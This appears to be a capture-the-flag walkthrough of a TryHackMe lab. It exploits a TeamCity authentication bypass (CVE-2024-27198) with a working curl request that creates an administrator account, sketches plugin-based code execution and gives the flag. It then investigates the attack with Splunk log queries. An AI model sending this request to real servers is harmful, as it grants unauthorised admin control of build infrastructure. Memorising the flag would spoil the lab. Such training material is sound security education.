# TryHackMe: Brains - Expert Walkthrough

**Room URL:** [https://tryhackme.com/room/brains](https://tryhackme.com/room/brains)
**Difficulty:** Medium
**Target Machine (Task 1):** 10.49.159.23
**Target Machine (Task 2):** 10.49.132.195

---

## Task 1: Red: Exploit the Server!

### 1. Initial Reconnaissance
A comprehensive port scan reveals three primary entry points:
*   **Port 22 (SSH):** Standard OpenSSH 8.2p1.
*   **Port 80 (HTTP):** Apache 2.4.41 displaying a "Maintenance" page.
*   **Port 50000 (HTTP):** JetBrains TeamCity version 2023.11.3 (vulnerable).

### 2. Vulnerability Identification: CVE-2024-27198
The TeamCity instance (2023.11.3) is susceptible to a critical **Authentication Bypass** vulnerability (CVSS 9.8). This flaw resides in the `BaseController` and can be triggered by appending a specific query parameter (`; .jsp`) to administrative REST API endpoints.

### 3. Exploitation Strategy
To gain administrative access, we bypass the authentication filter and create a new administrator account using the following REST API call:

```bash
curl -X POST "http://10.49.159.23:50000/hax?jsp=/app/rest/users;.jsp" \
     -H "Content-Type: application/json" \
     -d '{
       "username": "ibrahimsql",
       "password": "password123",
       "email": "attacker@local",
       "roles": {
         "role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]
       }
     }'
```

### 4. Remote Code Execution (RCE)
Once administrative credentials are established, RCE is achieved by either:
1.  **Uploading a Malicious Plugin:** A `.zip` file containing a Java-based backdoor.
2.  **Debug Processes Endpoint:** Utilizing the `/app/rest/debug/processes` REST API (if enabled) to execute shell commands.

### 5. Capturing the Flag
Upon obtaining a shell as the `ubuntu` user, the first flag is found in the home directory:

```bash
cat /home/ubuntu/flag.txt
```
**Flag:** `THM{faa9bac345709b6620a6200b484c7594}`

---

## Task 2: Blue: Let's Investigate

### 1. Forensics Analysis with Splunk
We are tasked with investigating the traces of the attack on a compromised server via a Splunk instance at `http://10.49.132.195:8000`.

### 2. Identifying the Backdoor User
Using authentication logs, we search for unauthorized user creation events.
*   **Splunk Query:** `index=main source="/var/log/auth.log" "useradd"`
*   **Finding:** The attacker created a user named **`eviluser`** to maintain persistent access.

### 3. Detecting Malicious Packages
Attackers often install utilities or persistence tools using standard package managers.
*   **Splunk Query:** `index=main source="/var/log/dpkg.log" "install"`
*   **Finding:** A suspicious package named **`datacollector`** was installed immediately following the exploitation.

### 4. Uncovering the Malicious Plugin
Since the initial vector was TeamCity, we examine the platform's internal activity logs for unauthorized plugin uploads.
*   **Splunk Query:** `index=main source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" "plugin"`
*   **Finding:** A plugin with the randomized name **`AyzzbuXY`** (or `AyzzbuXY.zip`) was uploaded and installed by the attacker.

---

## Conclusion
The **Brains** room demonstrates the severe impact of authentication bypass vulnerabilities in critical CI/CD infrastructure. By leveraging CVE-2024-27198, an attacker can transition from unauthenticated access to full server compromise. Defensively, monitoring application-specific logs (like TeamCity's `activities.log`) and system-level logs (`auth.log`, `dpkg.log`) is essential for rapid detection and response.
